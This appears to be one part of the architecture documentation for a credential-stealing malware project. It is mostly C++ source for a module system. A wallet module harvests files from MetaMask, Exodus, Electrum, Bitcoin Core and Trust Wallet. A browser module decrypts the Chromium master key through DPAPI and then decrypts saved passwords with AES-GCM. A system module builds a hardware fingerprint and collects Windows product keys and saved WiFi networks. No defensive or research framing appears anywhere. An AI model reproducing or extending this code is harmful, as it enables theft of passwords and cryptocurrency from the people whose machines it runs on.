# Module Design & Implementation

## Document Purpose

This document details the module architecture, interface design, and implementation patterns for data extraction modules.

---

## Module Interface

### Abstract Base Class

```cpp
// base_module.h

#pragma once

#include <string>
#include <vector>
#include <memory>
#include <functional>

// Module metadata
struct ModuleInfo {
    std::string name;
    std::string version;
    std::string description;
    std::string author;
    int apiVersion;
    int priority;
    std::vector<std::string> dependencies;
    std::vector<std::string> platforms;  // "windows", "linux", "macos"
};

// Data container
struct DataBlob {
    std::string name;
    std::string type;          // "file", "text", "binary"
    std::vector<uint8_t> data;
    std::string mimeType;
    std::map<std::string, std::string> metadata;
    
    size_t size() const { return data.size(); }
};

// Extraction result
struct ExtractionResult {
    bool success;
    std::string moduleName;
    std::vector<DataBlob> blobs;
    std::string error;
    uint64_t executionTimeMs;
    size_t totalDataSize;
    
    ExtractionResult() : success(false), executionTimeMs(0), totalDataSize(0) {}
};

// Abstract module interface
class IModule {
public:
    virtual ~IModule() = default;
    
    // Metadata
    virtual ModuleInfo getInfo() const = 0;
    virtual std::string getName() const = 0;
    virtual int getPriority() const = 0;
    
    // Lifecycle
    virtual bool initialize() = 0;
    virtual bool execute() = 0;
    virtual bool cleanup() = 0;
    
    // Data access
    virtual const ExtractionResult& getResult() const = 0;
    virtual size_t getDataSize() const = 0;
    
    // Capabilities
    virtual bool isAvailable() const = 0;
    virtual std::vector<std::string> getTargets() const = 0;
    
protected:
    ExtractionResult m_result;
    bool m_initialized;
    
    // Helper methods
    DataBlob createBlob(const std::string& name, 
                        const std::string& type,
                        const std::vector<uint8_t>& data);
    
    void logInfo(const std::string& message);
    void logError(const std::string& message);
    void logDebug(const std::string& message);
};
```

---

## Module Implementation Pattern

### Example: Wallet Module

```cpp
// wallet_module.h

#pragma once

#include "base_module.h"

class WalletModule : public IModule {
public:
    WalletModule();
    ~WalletModule() override;
    
    // IModule interface
    ModuleInfo getInfo() const override;
    std::string getName() const override;
    int getPriority() const override;
    
    bool initialize() override;
    bool execute() override;
    bool cleanup() override;
    
    const ExtractionResult& getResult() const override;
    size_t getDataSize() const override;
    
    bool isAvailable() const override;
    std::vector<std::string> getTargets() const override;
    
private:
    // Configuration
    struct WalletConfig {
        std::string name;
        std::vector<std::string> paths;
        bool includeLocked;
    };
    
    std::vector<WalletConfig> m_walletConfigs;
    bool m_includeLocked;
    
    // Extraction methods
    bool extractMetaMask();
    bool extractExodus();
    bool extractElectrum();
    bool extractBitcoinCore();
    bool extractTrustWallet();
    bool extractAtomic();
    
    // Helper methods
    bool extractFromPath(const std::string& walletName, 
                         const std::vector<std::string>& paths);
    
    std::vector<std::string> resolvePaths(
        const std::vector<std::string>& patterns);
    
    bool isFileLocked(const std::string& path);
    std::vector<uint8_t> readFile(const std::string& path);
};
```

### Implementation

```cpp
// wallet_module.cpp

#include "wallet_module.h"
#include "file_utils.h"
#include "logger.h"

WalletModule::WalletModule() 
    : m_includeLocked(false) {
    
    // Define wallet configurations
    m_walletConfigs = {
        {
            "MetaMask",
            {
                "%APPDATA%\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgmnn",
                "~/.config/google-chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgmnn"
            },
            false
        },
        {
            "Exodus",
            {
                "%APPDATA%\\Exodus\\exodus.wallet",
                "~/Library/Application Support/Exodus"
            },
            true
        },
        {
            "Electrum",
            {
                "%APPDATA%\\Electrum\\wallets",
                "~/.electrum/wallets"
            },
            true
        },
        {
            "Bitcoin Core",
            {
                "%APPDATA%\\Bitcoin\\wallet.dat",
                "~/.bitcoin/wallet.dat"
            },
            false
        },
        {
            "Trust Wallet",
            {
                "%APPDATA%\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\egjidjbpglichdcondbcbdnbddppkfpb"
            },
            false
        }
    };
}

WalletModule::~WalletModule() {
    cleanup();
}

ModuleInfo WalletModule::getInfo() const {
    ModuleInfo info;
    info.name = "wallet";
    info.version = "1.0.0";
    info.description = "Cryptocurrency wallet data extraction";
    info.apiVersion = 1;
    info.priority = 100;  // High priority
    info.platforms = {"windows", "linux", "macos"};
    return info;
}

std::string WalletModule::getName() const {
    return "wallet";
}

int WalletModule::getPriority() const {
    return 100;
}

bool WalletModule::initialize() {
    if (m_initialized) {
        return true;
    }
    
    logInfo("Initializing wallet module");
    
    // Validate configurations
    for (auto& config : m_walletConfigs) {
        logDebug("Configured wallet: " + config.name);
    }
    
    m_initialized = true;
    return true;
}

bool WalletModule::execute() {
    if (!m_initialized) {
        logError("Module not initialized");
        return false;
    }
    
    logInfo("Starting wallet extraction");
    auto startTime = getCurrentTimeMs();
    
    m_result.blobs.clear();
    m_result.success = false;
    
    bool anySuccess = false;
    
    // Extract from each wallet type
    for (const auto& config : m_walletConfigs) {
        logDebug("Attempting to extract: " + config.name);
        
        if (extractFromPath(config.name, config.paths)) {
            anySuccess = true;
            logInfo("Successfully extracted: " + config.name);
        } else {
            logDebug("No data found for: " + config.name);
        }
    }
    
    // Calculate totals
    m_result.executionTimeMs = getCurrentTimeMs() - startTime;
    m_result.totalDataSize = 0;
    for (const auto& blob : m_result.blobs) {
        m_result.totalDataSize += blob.size();
    }
    
    m_result.success = anySuccess;
    m_result.moduleName = getName();
    
    logInfo("Wallet extraction complete: " + 
            std::to_string(m_result.blobs.size()) + " files, " +
            std::to_string(m_result.totalDataSize) + " bytes");
    
    return m_result.success;
}

bool WalletModule::cleanup() {
    m_result.blobs.clear();
    m_initialized = false;
    return true;
}

bool WalletModule::extractFromPath(
    const std::string& walletName,
    const std::vector<std::string>& patterns) {
    
    // Resolve platform-specific paths
    auto paths = resolvePaths(patterns);
    
    for (const auto& path : paths) {
        logDebug("Checking path: " + path);
        
        if (!pathExists(path)) {
            continue;
        }
        
        // Check if file is locked
        if (!m_includeLocked && isFileLocked(path)) {
            logDebug("File is locked, skipping: " + path);
            continue;
        }
        
        // Read file
        auto data = readFile(path);
        if (data.empty()) {
            continue;
        }
        
        // Create data blob
        DataBlob blob = createBlob(
            walletName + "_" + getFileName(path),
            "file",
            data
        );
        
        blob.metadata["wallet"] = walletName;
        blob.metadata["source_path"] = path;
        blob.metadata["extracted_at"] = getTimestamp();
        
        m_result.blobs.push_back(std::move(blob));
    }
    
    return !m_result.blobs.empty();
}

std::vector<std::string> WalletModule::resolvePaths(
    const std::vector<std::string>& patterns) {
    
    std::vector<std::string> resolved;
    
    for (const auto& pattern : patterns) {
        // Expand environment variables and home directory
        std::string path = expandPath(pattern);
        
        // Handle wildcards
        if (path.find('*') != std::string::npos || 
            path.find('?') != std::string::npos) {
            auto matches = globPath(path);
            resolved.insert(resolved.end(), matches.begin(), matches.end());
        } else {
            resolved.push_back(path);
        }
    }
    
    return resolved;
}

bool WalletModule::isAvailable() const {
    // Check if any wallet paths exist
    for (const auto& config : m_walletConfigs) {
        auto paths = resolvePaths(config.paths);
        for (const auto& path : paths) {
            if (pathExists(path)) {
                return true;
            }
        }
    }
    return false;
}

std::vector<std::string> WalletModule::getTargets() const {
    std::vector<std::string> targets;
    for (const auto& config : m_walletConfigs) {
        targets.push_back(config.name);
    }
    return targets;
}

const ExtractionResult& WalletModule::getResult() const {
    return m_result;
}

size_t WalletModule::getDataSize() const {
    return m_result.totalDataSize;
}
```

---

## Browser Module

### Architecture

```cpp
// browser_module.h

#pragma once

#include "base_module.h"

struct BrowserProfile {
    std::string name;
    std::string path;
    std::string masterKey;  // For Chromium-based
};

class BrowserModule : public IModule {
public:
    BrowserModule();
    ~BrowserModule() override;
    
    // IModule interface
    ModuleInfo getInfo() const override;
    std::string getName() const override;
    int getPriority() const override;
    
    bool initialize() override;
    bool execute() override;
    bool cleanup() override;
    
    const ExtractionResult& getResult() const override;
    size_t getDataSize() const override;
    
    bool isAvailable() const override;
    std::vector<std::string> getTargets() const override;
    
private:
    // Browser configurations
    struct BrowserConfig {
        std::string name;
        std::string baseDir;
        std::vector<std::string> files;
        bool requiresMasterKey;
    };
    
    std::vector<BrowserConfig> m_browserConfigs;
    std::map<std::string, std::string> m_masterKeys;
    
    // Extraction targets
    bool extractPasswords(const std::string& browser, 
                          const std::string& profile);
    bool extractCookies(const std::string& browser,
                        const std::string& profile);
    bool extractHistory(const std::string& browser,
                        const std::string& profile);
    bool extractAutofill(const std::string& browser,
                         const std::string& profile);
    bool extractExtensions(const std::string& browser,
                           const std::string& profile);
    
    // Decryption (Chromium)
    bool decryptChromiumPassword(const std::vector<uint8_t>& encrypted,
                                 const std::string& masterKey,
                                 std::string& decrypted);
    
    // Master key extraction
    std::string extractMasterKey(const std::string& browserPath);
};
```

### Password Extraction Implementation

```cpp
// browser_module_passwords.cpp

#include "browser_module.h"
#include "sqlite_reader.h"
#include "crypto_utils.h"
#include "dpapi.h"

bool BrowserModule::extractPasswords(
    const std::string& browser,
    const std::string& profile) {
    
    logDebug("Extracting passwords from: " + browser);
    
    // Path to Login Data database
    std::string loginDataPath = profile + "/Login Data";
    
    if (!pathExists(loginDataPath)) {
        logDebug("Login Data not found for: " + browser);
        return false;
    }
    
    // Copy to temp location (database may be locked)
    std::string tempPath = getTempPath() + "/login_data_" + getRandomId();
    if (!copyFile(loginDataPath, tempPath)) {
        logError("Failed to copy Login Data");
        return false;
    }
    
    // Open SQLite database
    SQLiteDB db;
    if (!db.open(tempPath)) {
        logError("Failed to open Login Data database");
        return false;
    }
    
    // Query passwords
    auto results = db.query(
        "SELECT origin_url, username_value, password_value "
        "FROM logins"
    );
    
    if (results.empty()) {
        logDebug("No passwords found in: " + browser);
        return false;
    }
    
    // Get master key for decryption
    std::string masterKey;
    if (m_browserConfigs[0].requiresMasterKey) {
        masterKey = extractMasterKey(profile);
    }
    
    // Process results
    nlohmann::json passwords;
    
    for (const auto& row : results) {
        std::string url = row[0];
        std::string username = row[1];
        std::vector<uint8_t> encryptedPassword = row[2];
        
        // Decrypt password
        std::string decryptedPassword;
        
        if (m_browserConfigs[0].requiresMasterKey) {
            if (!decryptChromiumPassword(encryptedPassword, 
                                         masterKey, 
                                         decryptedPassword)) {
                logDebug("Failed to decrypt password for: " + url);
                continue;
            }
        } else {
            // Firefox uses different encryption
            decryptedPassword = decryptFirefoxPassword(encryptedPassword);
        }
        
        // Add to results
        nlohmann::json entry;
        entry["url"] = url;
        entry["username"] = username;
        entry["password"] = decryptedPassword;
        entry["browser"] = browser;
        
        passwords.push_back(entry);
    }
    
    // Create data blob
    std::string jsonStr = passwords.dump(2);
    std::vector<uint8_t> data(jsonStr.begin(), jsonStr.end());
    
    DataBlob blob = createBlob(
        browser + "_passwords",
        "json",
        data
    );
    
    blob.mimeType = "application/json";
    blob.metadata["browser"] = browser;
    blob.metadata["count"] = std::to_string(passwords.size());
    
    m_result.blobs.push_back(std::move(blob));
    
    // Cleanup temp file
    deleteFile(tempPath);
    
    logInfo("Extracted " + std::to_string(passwords.size()) + 
            " passwords from: " + browser);
    
    return true;
}

std::string BrowserModule::extractMasterKey(const std::string& profilePath) {
    // Local State file contains encrypted master key
    std::string localStatePath = profilePath + "/../Local State";
    
    if (!pathExists(localStatePath)) {
        logError("Local State not found");
        return "";
    }
    
    // Parse JSON
    auto localState = nlohmann::json::parse(readFileAsString(localStatePath));
    
    // Extract encrypted key
    std::string base64Key = 
        localState["os_crypt"]["encrypted_key"].get<std::string>();
    
    std::vector<uint8_t> encryptedKey = base64Decode(base64Key);
    
    // Remove DPAPI prefix
    std::vector<uint8_t> keyData(encryptedKey.begin() + 5, encryptedKey.end());
    
    // Decrypt using DPAPI
    std::vector<uint8_t> decryptedKey;
    if (!dpapiUnprotect(keyData, decryptedKey)) {
        logError("Failed to decrypt master key");
        return "";
    }
    
    return std::string(decryptedKey.begin(), decryptedKey.end());
}

bool BrowserModule::decryptChromiumPassword(
    const std::vector<uint8_t>& encrypted,
    const std::string& masterKey,
    std::string& decrypted) {
    
    // AES-256-GCM encryption
    // Format: "v10" + IV (12 bytes) + ciphertext + tag (16 bytes)
    
    if (encrypted.size() < 3 + 12 + 16) {
        return false;
    }
    
    // Skip version prefix
    std::vector<uint8_t> data(encrypted.begin() + 3, encrypted.end());
    
    // Extract IV
    std::vector<uint8_t> iv(data.begin(), data.begin() + 12);
    
    // Extract ciphertext + tag
    std::vector<uint8_t> ciphertext(data.begin() + 12, data.end());
    
    // Decrypt
    return aesGcmDecrypt(
        ciphertext,
        std::vector<uint8_t>(masterKey.begin(), masterKey.end()),
        iv,
        decrypted
    );
}
```

---

## System Module

### Implementation

```cpp
// system_module.h

#pragma once

#include "base_module.h"

class SystemModule : public IModule {
public:
    SystemModule();
    ~SystemModule() override;
    
    // IModule interface
    ModuleInfo getInfo() const override;
    std::string getName() const override;
    int getPriority() const override;
    
    bool initialize() override;
    bool execute() override;
    bool cleanup() override;
    
    const ExtractionResult& getResult() const override;
    size_t getDataSize() const override;
    
    bool isAvailable() const override;
    std::vector<std::string> getTargets() const override;
    
private:
    // Data collection methods
    void collectHardwareInfo(nlohmann::json& data);
    void collectOSInfo(nlohmann::json& data);
    void collectNetworkInfo(nlohmann::json& data);
    void collectUserInfo(nlohmann::json& data);
    void collectInstalledSoftware(nlohmann::json& data);
    void collectRunningProcesses(nlohmann::json& data);
    
    // Platform-specific implementations
    std::string getCPUID();
    std::string getMotherboardSerial();
    std::string getMACAddress();
    std::string getDiskSerial();
    std::string getGPUInfo();
    std::string getWindowsProductKey();
};
```

```cpp
// system_module.cpp

#include "system_module.h"
#include "hardware_utils.h"
#include "network_utils.h"

SystemModule::SystemModule() {}

ModuleInfo SystemModule::getInfo() const {
    ModuleInfo info;
    info.name = "system";
    info.version = "1.0.0";
    info.description = "System information and hardware fingerprint";
    info.apiVersion = 1;
    info.priority = 90;
    info.platforms = {"windows", "linux", "macos"};
    return info;
}

std::string SystemModule::getName() const {
    return "system";
}

int SystemModule::getPriority() const {
    return 90;
}

bool SystemModule::execute() {
    logInfo("Collecting system information");
    auto startTime = getCurrentTimeMs();
    
    nlohmann::json systemData;
    
    // Collect all system information
    collectHardwareInfo(systemData["hardware"]);
    collectOSInfo(systemData["os"]);
    collectNetworkInfo(systemData["network"]);
    collectUserInfo(systemData["user"]);
    collectInstalledSoftware(systemData["software"]);
    collectRunningProcesses(systemData["processes"]);
    
    // Generate hardware fingerprint (HWID)
    systemData["hwid"] = generateHWID(systemData["hardware"]);
    
    // Create data blob
    std::string jsonStr = systemData.dump(2);
    std::vector<uint8_t> data(jsonStr.begin(), jsonStr.end());
    
    DataBlob blob = createBlob("system_info", "json", data);
    blob.mimeType = "application/json";
    blob.metadata["hwid"] = systemData["hwid"];
    
    m_result.blobs.push_back(std::move(blob));
    
    m_result.executionTimeMs = getCurrentTimeMs() - startTime;
    m_result.totalDataSize = blob.size();
    m_result.success = true;
    m_result.moduleName = getName();
    
    logInfo("System information collected: HWID=" + 
            systemData["hwid"].get<std::string>());
    
    return true;
}

void SystemModule::collectHardwareInfo(nlohmann::json& data) {
    data["cpu"] = getCPUInfo();
    data["cpu_id"] = getCPUID();
    data["motherboard"] = getMotherboardSerial();
    data["gpu"] = getGPUInfo();
    data["ram"] = getRAMAmount();
    data["disk_size"] = getDiskSize();
    data["disk_serial"] = getDiskSerial();
    data["mac_address"] = getMACAddress();
    data["screen_resolution"] = getScreenResolution();
}

void SystemModule::collectOSInfo(nlohmann::json& data) {
    data["os_name"] = getOSName();
    data["os_version"] = getOSVersion();
    data["os_build"] = getOSBuild();
    data["architecture"] = getArchitecture();
    data["language"] = getSystemLanguage();
    data["timezone"] = getTimezone();
    data["uptime"] = getUptime();
    
    #ifdef _WIN32
    data["product_key"] = getWindowsProductKey();
    #endif
}

void SystemModule::collectNetworkInfo(nlohmann::json& data) {
    data["hostname"] = getHostname();
    data["ip_addresses"] = getIPAddresses();
    data["default_gateway"] = getDefaultGateway();
    data["dns_servers"] = getDNSServers();
    data["wifi_networks"] = getSavedWiFiNetworks();
}

void SystemModule::collectUserInfo(nlohmann::json& data) {
    data["username"] = getUsername();
    data["hostname"] = getHostname();
    data["home_dir"] = getHomeDirectory();
    data["is_admin"] = isAdmin();
}

std::string SystemModule::generateHWID(const nlohmann::json& hardware) {
    // Create unique fingerprint from hardware identifiers
    std::string fingerprint = 
        hardware["cpu_id"].get<std::string>() +
        hardware["motherboard"].get<std::string>() +
        hardware["mac_address"].get<std::string>() +
        hardware["disk_serial"].get<std::string>();
    
    // Hash to create HWID
    return sha256(fingerprint);
}
```

---

## Module Factory Registration

### Registration Macro

```cpp
// module_registry.h

#pragma once

#include "base_module.h"
#include <map>
#include <functional>

using ModuleFactory = std::function<std::shared_ptr<IModule>()>;

class ModuleRegistry {
public:
    static ModuleRegistry& instance();
    
    void registerModule(const std::string& name, ModuleFactory factory);
    std::shared_ptr<IModule> createModule(const std::string& name);
    std::vector<std::string> getRegisteredModules() const;
    
private:
    std::map<std::string, ModuleFactory> m_factories;
};

// Registration macro
#define REGISTER_MODULE(Name, Type) \
    namespace { \
        struct Name##Registrar { \
            Name##Registrar() { \
                ModuleRegistry::instance().registerModule( \
                    #Name, \
                    []() { return std::make_shared<Type>(); } \
                ); \
            } \
        }; \
        static Name##Registrar g_##Name##Registrar; \
    }

// Usage in each module:
// REGISTER_MODULE(wallet, WalletModule)
// REGISTER_MODULE(browser, BrowserModule)
// REGISTER_MODULE(system, SystemModule)
```

---

## Module Communication

### Event System

```cpp
// events.h

#pragma once

#include <string>
#include <functional>
#include <map>
#include <vector>

enum class EventType {
    ModuleStarted,
    ModuleCompleted,
    ModuleFailed,
    DataExtracted,
    ErrorOccurred,
    ProgressUpdate
};

struct Event {
    EventType type;
    std::string source;
    std::string message;
    std::map<std::string, std::string> data;
    uint64_t timestamp;
};

using EventHandler = std::function<void(const Event&)>;

class EventBus {
public:
    static EventBus& instance();
    
    void subscribe(EventType type, EventHandler handler);
    void unsubscribe(EventType type, EventHandler handler);
    void publish(const Event& event);
    
private:
    std::map<EventType, std::vector<EventHandler>> m_handlers;
    std::mutex m_mutex;
};

// Usage in modules:
Event event;
event.type = EventType::DataExtracted;
event.source = getName();
event.message = "Extracted 5 files";
event.data["count"] = "5";
event.timestamp = getCurrentTimeMs();

EventBus::instance().publish(event);
```

---

**Document:** 03/06  
**Version:** 1.0  
**Classification:** Technical Architecture
